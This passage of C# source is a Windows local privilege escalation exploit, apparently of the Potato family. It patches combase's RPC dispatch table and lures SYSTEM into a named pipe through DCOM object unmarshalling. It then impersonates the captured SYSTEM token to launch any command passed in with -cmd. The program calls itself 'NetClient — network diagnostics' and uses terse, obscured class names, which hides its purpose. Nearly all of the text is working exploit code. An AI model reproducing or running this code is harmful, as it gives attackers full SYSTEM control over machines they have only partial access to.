            finally { Marshal.FreeHGlobal(pat); }
        }
    }

    // ========================================================================
    // Environment / context
    // ========================================================================
    class Env
    {
        public IntPtr CombaseModule { get; private set; }
        public IntPtr DispatchTablePtr { get; private set; }
        public IntPtr UseProtseqFnPtr { get; private set; }
        public uint   UseProtseqParamCount { get; private set; }

        IntPtr[] _tbl;
        short[]  _offsets;
        IntPtr   _procStr;
        Delegate _hook;

        public string ServerPipe { get; private set; }
        public string ClientEp { get; private set; }

        public WindowsIdentity SysIdentity { get; private set; }
        Thread _th;
        public bool IsHooked { get; private set; }
        public bool IsRunning { get; private set; }

        public Env(string tag)
        {
            string sfx = Vault.PipeSuffix();
            ServerPipe = Vault.LocalPipe() + tag + sfx;
            ClientEp = Vault.NpPrefix() + tag + "[" + sfx + "]";
            Init();
            Bind();
        }

        void Init()
        {
            string cb = Vault.CombaseName();
            Guid iface = Vault.IfaceGuid();

            foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
            {
                if (m.ModuleName == null) continue;
                if (m.ModuleName.ToLowerInvariant() != cb) continue;

                CombaseModule = m.BaseAddress;

                var pat = new MemoryStream();
                var bw = new BinaryWriter(pat);
                bw.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                bw.Write(iface.ToByteArray());
                bw.Flush();
                byte[] pattern = pat.ToArray();

                byte[] content = new byte[m.ModuleMemorySize];
                Marshal.Copy(m.BaseAddress, content, 0, content.Length);

                var hits = Bs.Find(content, pattern);
                if (hits.Count == 0) throw new Exception("iface pattern not found");

                IntPtr hp = new IntPtr(m.BaseAddress.ToInt64() + hits[0]);
                var srv = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(hp, typeof(RPC_SERVER_INTERFACE));
                var disp = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(srv.DispatchTable, typeof(RPC_DISPATCH_TABLE));
                var midl = (MIDL_SERVER_INFO)Marshal.PtrToStructure(srv.InterpreterInfo, typeof(MIDL_SERVER_INFO));

                DispatchTablePtr = midl.DispatchTable;
                _procStr = midl.ProcString;

                int n = (int)disp.DispatchTableCount;
                _tbl = new IntPtr[n];
                _offsets = new short[n];
                for (int i = 0; i < n; i++)
                    _tbl[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);
                for (int i = 0; i < n; i++)
                    _offsets[i] = Marshal.ReadInt16(midl.FmtStringOffset, i * sizeof(short));

                UseProtseqFnPtr = _tbl[0];
                UseProtseqParamCount = Marshal.ReadByte(_procStr, _offsets[0] + 19);

                Tr.O(string.Format("module @ 0x{0:X}  tbl @ 0x{1:X}  pc={2}",
                    CombaseModule.ToInt64(), DispatchTablePtr.ToInt64(), UseProtseqParamCount));
                return;
            }
            throw new Exception("combase module missing");
        }

        void Bind()
        {
            var rpc = new Dp(this);
            switch (UseProtseqParamCount)
            {
                case 4:  _hook = new Dp.D4(rpc.F4);   break;
                case 5:  _hook = new Dp.D5(rpc.F5);   break;
                case 6:  _hook = new Dp.D6(rpc.F6);   break;
                case 7:  _hook = new Dp.D7(rpc.F7);   break;
                case 8:  _hook = new Dp.D8(rpc.F8);   break;
                case 9:  _hook = new Dp.D9(rpc.F9);   break;
                case 10: _hook = new Dp.D10(rpc.F10); break;
                case 11: _hook = new Dp.D11(rpc.F11); break;
                case 12: _hook = new Dp.D12(rpc.F12); break;
                case 13: _hook = new Dp.D13(rpc.F13); break;
                case 14: _hook = new Dp.D14(rpc.F14); break;
                default: throw new Exception("pc=" + UseProtseqParamCount);
            }
        }

        public void Attach()
        {
            uint old;
            uint sz = (uint)(IntPtr.Size * _tbl.Length);
            if (!W.VirtualProtect(DispatchTablePtr, sz, 0x04, out old))
                throw new Exception("VirtualProtect: " + Tr.E());
            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(_hook));
            IsHooked = true;
            Tr.O("dispatch patched");
        }

        public void Detach()
        {
            if (!IsHooked || UseProtseqFnPtr == IntPtr.Zero) return;
            try { Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFnPtr); IsHooked = false; Tr.I("dispatch restored"); }
            catch (Exception e) { Tr.W("Detach: " + e.Message); }
        }

        void Server()
        {
            IntPtr sd; uint sdSz;
            if (!W.ConvertStringSecurityDescriptorToSecurityDescriptor(
                "D:(A;OICI;GA;;;WD)", 1, out sd, out sdSz))
            { Tr.F("SDDL: " + Tr.E()); return; }

            var sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            sa.pSecurityDescriptor = sd;
            sa.bInheritHandle = false;

            IntPtr hPipe = W.CreateNamedPipe(ServerPipe,
                C.PIPE_ACCESS_DUPLEX,
                C.PIPE_TYPE_BYTE | C.PIPE_READMODE_BYTE | C.PIPE_WAIT,
                C.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, ref sa);

            if (hPipe == IntPtr.Zero || hPipe == new IntPtr(-1))
            { Tr.F("CreateNamedPipe: " + Tr.E()); if (sd != IntPtr.Zero) W.LocalFree(sd); return; }

            Tr.I("pipe ready");

            try
            {
                bool ok = W.ConnectNamedPipe(hPipe, IntPtr.Zero);
                int err = Marshal.GetLastWin32Error();
                if (!ok && err != C.ERROR_PIPE_CONNECTED)
                { Tr.F("ConnectNamedPipe err=" + err); return; }

                Tr.O("peer connected");

                // FIX: читаем первые байты RPC-запроса, иначе Impersonate = 1368
                byte[] tmp = new byte[512];
                uint got = 0;
                if (!W.ReadFile(hPipe, tmp, (uint)tmp.Length, out got, IntPtr.Zero))
                { Tr.F("ReadFile: " + Tr.E()); return; }
                Tr.I("read " + got + " bytes");

                if (!W.ImpersonateNamedPipeClient(hPipe))
                { Tr.F("Impersonate: " + Tr.E()); return; }

                var id = WindowsIdentity.GetCurrent();
                Tr.I("as " + id.Name + " level=" + id.ImpersonationLevel);

                if (id.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                    SysIdentity = id;
                else { Tr.W("level too low"); W.RevertToSelf(); }
            }
            finally
            {
                if (hPipe != IntPtr.Zero && hPipe != new IntPtr(-1))
                { W.DisconnectNamedPipe(hPipe); W.CloseHandle(hPipe); }
                if (sd != IntPtr.Zero) W.LocalFree(sd);
            }
        }

        public void Listen()
        {
            _th = new Thread(Server);
            _th.IsBackground = true;
            _th.Start();
            IsRunning = true;
        }

        public void Stop()
        {
            IsRunning = false;
            if (_th == null) return;
            try
            {
                IntPtr h = W.CreateFileW(ServerPipe,
                    0x40000000 | 0x80000000, FileShare.ReadWrite,
                    IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                if (h != IntPtr.Zero && h != new IntPtr(-1))
                {
                    using (var sfh = new SafeFileHandle(h, false))
                    using (var fs = new FileStream(sfh, FileAccess.Write))
                    { fs.WriteByte(0xAA); fs.Flush(); }
                    W.CloseHandle(h);
                }
            }
            catch { }
            _th.Join(3000);
        }

        public WindowsIdentity Grab() { return SysIdentity; }
    }

    // ========================================================================
    // Trigger
    // ========================================================================
    class Tg
    {
        static readonly Guid IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046");

        Env _e;
        object _fake = new object();
        IntPtr _u;
        IBindCtx _bc;
        IMoniker _mk;

        public Tg(Env e)
        {
            _e = e;
            _u = Marshal.GetIUnknownForObject(_fake);
            W.CreateBindCtx(0, out _bc);
            W.CreateObjrefMoniker(_u, out _mk);
        }

        public int Fire()
        {
            string dn;
            _mk.GetDisplayName(_bc, null, out dn);
            dn = dn.Replace("objref:", "").Replace(":", "");
            byte[] ob = Convert.FromBase64String(dn);

            var src = new Rf(ob);
            Tr.I("OXID: 0x" + src.StandardObjRef.OX.ToString("X"));
            Tr.I("IPID: " + src.StandardObjRef.IPID);

            var sb = new Rf.Str(TowerProtocol.NP, "localhost");
            var sec = new Rf.Sec(0xa, 0xffff, null);
            var dsa = new Rf.Dual(sb, sec);

            var rf = new Rf(IID_IUnknown,
                new Rf.Std(0, 1, src.StandardObjRef.OX, src.StandardObjRef.OID,
                    src.StandardObjRef.IPID, dsa));
            byte[] data = rf.GetBytes();
            Tr.I("bytes=" + data.Length);

            using (var ms = new MemoryStream(data))
            {
                IntPtr p;
                Guid g = IID_IUnknown;
                return W.CoUnmarshalInterface(new Ms(ms), ref g, out p);
            }
        }
    }

    // ========================================================================
    // Program
    // ========================================================================
    class Program
    {
        static void Main(string[] args)
        {
            Vault.Touch();

            Console.WriteLine(@"
    __  __        ___               
   / / / /_  __  /   |  ____  ____  
  / /_/ / / / / / /| | / __ \/ __ \ 
 / __  / /_/ / / ___ |/ /_/ / /_/ / 
/_/ /_/\__, / /_/  |_/ .___/ .___/  
      /____/        /_/   /_/       
    NetClient — network diagnostics
");

            string cmd = null;
            for (int i = 0; i < args.Length; i++)
                if ((args[i] == "-cmd" || args[i] == "--cmd") && i + 1 < args.Length)
                    cmd = args[++i];

            if (string.IsNullOrEmpty(cmd))
            { Console.WriteLine("Usage: NetClient.exe -cmd \"cmd.exe /c whoami\""); return; }

            Tr.I("cmd: " + cmd);

            if (!Pv.Enable("SeImpersonatePrivilege"))
            { Tr.F("SeImpersonate unavailable"); return; }
            Tr.O("SeImpersonate enabled");

            Env env = null;
            bool attached = false;
            try
            {
                string tag = "svc_" + Guid.NewGuid().ToString("N").Substring(0, 10);
                env = new Env(tag);

                env.Attach();
                attached = true;
                env.Listen();

                var tg = new Tg(env);
                Tr.I("sending...");
                int hr = tg.Fire();
                Tr.I("hr = 0x" + hr.ToString("X8"));

                for (int i = 0; i < 100; i++)
                { if (env.Grab() != null) break; Thread.Sleep(100); }

                var id = env.Grab();
                if (id == null) { Tr.F("no peer identity"); return; }

                string sid = Pv.Sid(id.Token);
                string il = Pv.Il(id.Token);
                Tr.I("SID: " + sid);
                Tr.I("IL : " + il);

                if (sid != C.SYSTEM_SID) { Tr.F("not SYSTEM"); return; }
                Tr.O("SYSTEM captured");

                PROCESS_INFORMATION pi;
                if (!Pv.Run(id.Token, cmd, out pi)) { Tr.F("spawn failed"); return; }

                if (pi.hThread != IntPtr.Zero) W.CloseHandle(pi.hThread);
                if (pi.hProcess != IntPtr.Zero) W.CloseHandle(pi.hProcess);
                Tr.O("done");
            }
            catch (Exception e)
            {
                Tr.F(e.GetType().Name + ": " + e.Message);
                if (e.InnerException != null) Tr.F("  " + e.InnerException.Message);
            }
            finally
            {
                if (env != null)
                {
                    if (attached) env.Detach();
                    try { env.Stop(); } catch { }
                }
            }
        }
    }
}
